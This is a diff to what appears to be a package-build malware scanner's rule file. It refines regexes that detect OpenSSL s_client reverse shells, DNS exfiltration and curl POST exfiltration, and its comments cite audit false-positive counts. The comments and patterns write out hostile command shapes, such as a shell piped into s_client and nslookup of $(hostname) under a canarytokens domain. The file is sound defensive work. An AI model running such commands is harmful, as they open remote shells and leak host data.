@@ -327,7 +327,13 @@ override_gate = false
 
 [[pkgbuild_analysis]]
 id = "P-OPENSSL-CLIENT"
-pattern = 'openssl\s+s_client'
+# `openssl s_client` is how everyone fetches a certificate (`echo | openssl s_client -connect
+# host:443 | openssl x509 -noout -enddate`), tests TLS, or tunnels ssh (ProxyCommand=openssl
+# s_client ...); the audit found 55 of 80 withdrawn lines firing on the command name. An encrypted C2
+# channel is a shell wired to it: the rule now needs s_client piped into a shell, or an interactive
+# `sh -i` piped into s_client, on the same line (the mkfifo form is P-MKFIFO's). Replay: withdrawn
+# 55 -> 1 (library 50 -> 1), a detector's `s_client|/bin/bash|s_client` test vector.
+pattern = 'openssl[ \t]+s_client\b[^\n]{0,300}?\|[ \t]*(?:sudo[ \t]+)?(?:/usr)?(?:/bin/)?(?:ba|z|da|k)?sh\b|\b(?:ba|z|da|k)?sh[ \t]+-i\b[^\n]{0,200}?\|[ \t]*openssl[ \t]+s_client\b'
 points = 55
 description = "OpenSSL client connection (possible encrypted C2 channel)"
 override_gate = false
@@ -574,14 +580,32 @@ override_gate = false
 # DNS/HTTP exfiltration
 [[pkgbuild_analysis]]
 id = "P-DNS-EXFIL"
-pattern = '(?:^|[^A-Za-z0-9_])(dig|nslookup)\s+\$|(?:^|[;&|(`])\s*host\s+\$'
+# DNS exfiltration puts the data in a label: `nslookup $(hostname).x.canarytokens.com`, `dig
+# $chunk.<domain>`. `\$` alone matched JavaScript template literals (`host ${host} is not
+# allowed`, `nslookup ${options.host}`), PHP echo strings ("(host $host)") and a plain lookup of a
+# configured name (`until nslookup $domain`). The 2026-10 audit found 37 of 186 withdrawn lines
+# firing. The rule now needs a command substitution (`$(...)`, backquotes) or a plain `$var` /
+# `${var}` used as the first label, followed by `.` and more of the name. Replay: withdrawn 37 -> 6
+# (library 37 -> 6), all exfiltration test vectors and attack-step text; verified-malware lines
+# 2 -> 2.
+pattern = '(?:^|[^A-Za-z0-9_-])(?:dig|nslookup)[ \t]+(?:[-+]\S+[ \t]+)*["\x27]?(?:\$\([^)\n]{1,80}\)|`[^`\n]{1,80}`|\$\w+|\$\{\w+\})\.[A-Za-z0-9{<$]|(?:^|[;&|(`])[ \t]*host[ \t]+["\x27]?(?:\$\([^)\n]{1,80}\)|`[^`\n]{1,80}`|\$\w+|\$\{\w+\})\.[A-Za-z0-9{<$]'
 points = 60
 description = "DNS lookup with variable interpolation (possible DNS exfiltration)"
 override_gate = false
 
 [[pkgbuild_analysis]]
 id = "P-CURL-POST-DATA"
-pattern = 'curl\s+[^;|&\n]*(-d\s+\$|--data[^;|&\n]*\$|-X\s+POST[^;|&\n]*\$)'
+# On npm (not demoted outside hooks) the rule matched curl commands printed for a human
+# (`console.log(`  curl -X POST http://localhost:${PORT}/mock/reset`)`) and hooks posting to the
+# tool's own local server (`curl -s -X POST http://127.0.0.1:${port}/hook/${event} -d @-`). A line
+# whose curl sits inside a print/log/error string (suppressPrintedHint), or whose every host is
+# loopback (suppressLoopbackPost), is suppressed: nothing leaves the machine. The `$` must also start
+# a shell or PHP variable (`$X`, `$(cmd)`, `${VAR}`, `${VAR:-x}`, `{$url}`), not a JavaScript
+# template expression building the command string (`${JSON.stringify(url)}`, `${flags.url}`).
+# Replay: withdrawn 151 -> 108 (library 47 -> 25); verified-malware lines 3 -> 2, the one lost is a
+# detector's regex (`re.compile(r"curl\s+.*--data.*\$\(")`). What is left is mostly API examples a
+# CLI prints for its own service, which the line alone cannot tell from an upload.
+pattern = 'curl\s+[^;|&\n]*(-d\s+\$(?:[A-Za-z_(]|\{[A-Za-z_]\w*[}:])|--data[^;|&\n]*\$(?:[A-Za-z_(]|\{[A-Za-z_]\w*[}:])|-X\s+POST[^;|&\n]*\$(?:[A-Za-z_(]|\{[A-Za-z_]\w*[}:]))'
 points = 55
 description = "curl POST with variable data (possible data exfiltration)"
 override_gate = false
